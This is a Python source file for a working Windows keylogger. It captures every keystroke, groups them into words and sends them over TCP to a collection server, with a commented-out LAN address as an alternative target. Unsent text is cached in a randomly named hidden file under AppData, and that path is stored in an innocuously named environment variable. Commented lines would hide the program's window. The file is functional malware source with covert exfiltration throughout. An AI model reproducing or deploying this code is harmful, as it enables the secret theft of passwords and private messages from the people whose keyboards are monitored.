# encoding=latin1

import queue
import socket

from os import getenv, mkdir, path
from random import choice
from string import ascii_letters, ascii_uppercase
from subprocess import PIPE, run
from typing import Sequence
from keyboard import KeyboardEvent, start_recording


def random_string(size, charset):
	"""
	Generates a random string of a given size using the passed charset

	:param size: The length of the generated string
	:type size: int
	:param charset: The set of characters to choose from
	:type charset: Sequence
	:return: A randomly generated string
	:rtype: str
	"""

	return ''.join(choice(charset) for _ in range(size))


def create_random_dir_and_file():
	"""
	If the logger already created a random hidden directory, returns this path.
	Otherwise, creates a random file within a random directory, stores the path in the
	environment variable SECURITY_KEY and returns it.

	:return: Either the generated path, or the one that was saved in environment variables
	:rtype: str
	"""

	saved_path = getenv("SECURITY_KEY", None)
	# If it exists, we check if it maps to a valid dir
	if saved_path is not None:
		try:
			x = open(saved_path, "a")
			x.close()
		except FileNotFoundError:
			# The environment var exists but the directory was deleted
			# -> recreate one and update env var
			saved_path = None

	if saved_path is None:
		random_directory_name = random_string(15, ascii_uppercase)
		random_directory_path = path.expandvars("%appdata%\\" + random_directory_name)
		random_file = random_string(15, ascii_letters)
		mkdir(random_directory_path)

		final = random_directory_path + "\\" + random_file

		# Set env var as new random file in the new random dir
		result = run(["setx", "SECURITY_KEY", final], check=False, stderr=PIPE).stderr

		if result is not None:
			# Somehow couldnt create environment variable
			return None

		return final

	return saved_path


class Logger:
	def __init__(self, host: str, port: int, log_file: str):
		self.input_queue = start_recording()[0]
		self.output_queue = queue.Queue()
		self.current_string = ''
		self.address = (host, port)
		self.serving = True
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.filename = log_file
		if not self.check_file_empty():
			self.publish_from_file()
			self.socket.close()

	def check_file_empty(self) -> bool:
		"""
		Checks that the supplied filename is a valid file and it's size.

		:return: Wether the file exists and is empty
		:rtype: bool
		"""
		return path.isfile(self.filename) and path.getsize(self.filename) == 0

	def init_conn(self) -> None:
		"""
		Creates a socket connection to the server.
		"""
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.connect(self.address)

	def on_event(self, event) -> None:
		"""
		Handle any intercepted keyboard input.

		:param event: The keyboard event detected by the keyboard module
		:type event: KeyboardEvent
		"""

		name, event_type = event.name, event.event_type
		if name in ["space", "enter"] and self.current_string:
			if name == "enter":
				self.current_string += "ENTER"
			self.output_queue.put(self.current_string)
			self.current_string = ""
			return
		if name == "backspace" and event_type == "down":
			self.current_string += "BACKSPACE"
			return
		if name in ["ctrl", "alt", "tab"]:
			if event_type == "up":
				self.current_string += name.upper()
			return
		if event_type == "down" and name not in ["maj", "space", "enter"]:
			self.current_string += event.name

	def publish(self):
		"""
		Empty the queue by sending the intercepted keyboard activity to the specified server.
		If a connection cannot be established, return False to properly handle it later.

		:return: Wether the operation was successful.
		:rtype: bool
		"""

		try:
			self.init_conn()
		except ConnectionRefusedError:
			return False

		if not self.check_file_empty():
			succeeded = self.publish_from_file(True)
			if not succeeded:
				# There was a connection error while sending from the file, so it's likely there will be one when sending
				# from the queue so  don't try to
				return False

		while self.output_queue.qsize():
			current = self.output_queue.get() + " "
			try:
				self.socket.send(current.encode(encoding="latin-1", errors="ignore"))
				response = self.socket.recv(32)
				if response == b"OK":
					self.output_queue.task_done()
			except (ConnectionAbortedError, ConnectionResetError):
				return False
		self.socket.close()
		return True

	def publish_from_file(self, connected=False) -> bool:
		"""
		If a previous publish attempt failed, the words to be sent were written to the file, so try to send them again.

		:return: If a word couldn't be sent return False, else True
		:rtype: bool
		"""

		if not connected:
			try:
				self.init_conn()
			except ConnectionRefusedError:
				return False

		with open(self.filename, "r") as _:
			# Read all the words that need to be sent
			data = _.readlines()
		failed = []

		for line in data:
			line = line.strip()
			for word in line.split(" "):
				try:
					self.socket.send(word.encode(encoding="latin-1", errors="ignore"))
					response = self.socket.recv(32)
					if response != b"OK":
						# Something went wrong, mark it as failed
						failed.append(word)
				except (ConnectionAbortedError, ConnectionResetError):
					return False

		if failed:
			# The failed list is not empty, some words couldn't be sent so write them back
			with open(self.filename, "w") as _:
				_.write(' '.join(word for word in failed))
			return False
		else:
			# Everything was sent correctly, so erase the contents of the file
			open(self.filename, "w").close()
			return True

	def handle_input(self) -> None:
		"""
		The core method of the keylogger. Handle every intercepted keyboard input. When more than 10 "words" have been
		captured, try to publish them. If an error occurs, ie a connection can't be established or it is interrupted,
		save every remaining word to the specified "secret" file.
		"""

		while self.serving:
			event = self.input_queue.get()
			self.on_event(event)
			self.input_queue.task_done()
			if self.output_queue.qsize() >= 10:  # Arbitrary treshold, can/should be adjusted
				if not self.publish():
					# There was an error while publishing, so save to file
					with open(self.filename, "a") as _:
						while self.output_queue.qsize():
							current = self.output_queue.get() + " "
							_.write(current)
							self.output_queue.task_done()


if __name__ == '__main__':
	file = create_random_dir_and_file()

	if file is None:
		# Somehow couldnt create environment variable, so no use creating a directory
		# -> storing in Appdata\Local\Temp
		file = path.expandvars("%TMP%" + "\\" + random_string(15, ascii_letters))

	logger = Logger("localhost", 9001, file)  # 192.168.1.38
	# this_window = win32gui.GetForegroundWindow()
	# win32gui.ShowWindow(this_window, win32con.SW_HIDE)
	logger.handle_input()
